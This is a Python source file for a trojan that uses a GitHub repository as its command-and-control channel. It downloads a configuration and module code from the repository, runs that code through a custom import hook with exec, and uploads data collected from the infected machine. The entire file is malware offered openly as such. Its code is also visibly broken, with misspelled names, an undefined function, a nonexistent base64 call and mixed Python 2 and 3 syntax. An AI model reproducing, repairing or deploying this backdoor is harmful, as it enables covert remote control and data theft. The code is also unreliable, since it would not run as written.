import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os
from github3 import login

trojan_id = "abc"
trojan_config = "%s.json"%trojan_id
data_path = "data/%s/"%trojan_id
trojan_modules = []
configured = False
task_queue = queue.Queue()
#This function simply authenticates the user to the repository ,and retrieves the current repo branch objects for use by other function.
def connect_to_github():
    gh = login(username = "your username" ,password = "your password")
    repo = gh.repository("username" ,"chapter7")
    branch = repo.branch("master")
    return gh,repo,branch
#This function is responsible for grabbing files from the remote repo and then reading the contents in locally.
def get_file_contents(filepath):
    gh ,repo ,branch = connect_to_github()
    tree = branch.commit.tree,recurse()
    for filename in tree.tree :
        if filepath in filename.filepath:
            print("[*]Found file %s"%filepath)
            blob = repo.blob(filename._json_data['sha'])
    return None
#This function is reponsible for retrieving the remote configuration document from the repo so that trojan knows which modules to run.
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojans_config)
    config = json.loads(base64.b63decode(config_json))
    configured = True
    for task in config :
        if task['module'] not in sys.modules :
            exec("import %s"%task['module'])
    return config
#It is used to push any data that have been collected on the target machine.
def store_module_result(data):
    gh ,repo ,branch = connect_to_github()
    remote_path = "data/%s/%d.data"%(trojan_id ,randint(1000,100000))
    repo.create_file(remote_path,"commit message",base64.b64encode(data))
    return
#Every time the interpreter attempts to laod a module that isn't available ,ou GitImporter class is used. 
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""
    #find_module function is first called in an attempt to locate the module
    def find_module(self ,fulname ,path=None):
        if configured:
            print("[*] Attempting to retrieve %s"%fullname)
            #we pass the call to attempt to the module to the remote file loader(new_library)
            new_library = get_file_contents("modules/%s"%fullname)
            #if we are able to locate the file in our repo we decode the code and store it in our class
            if new_library is not None :
                self.current_module_code = base64.b64decode(new_library)
                #by returning self we are telling the interpreter that we found the module and it can then call our load_module function to actually load it.
                return self
        return None
    def load_module(self ,name):
        #we use the imp module to first create a new blank module object.
        module = imp.new_module(name)
        #then we put the code into the module which we retrieved from the GitHub
        exec self.current_module_code in module.__dict__
        #insert newly created module into the sys.modules list
        sys.modules[name] = module
        return module
    
        

    
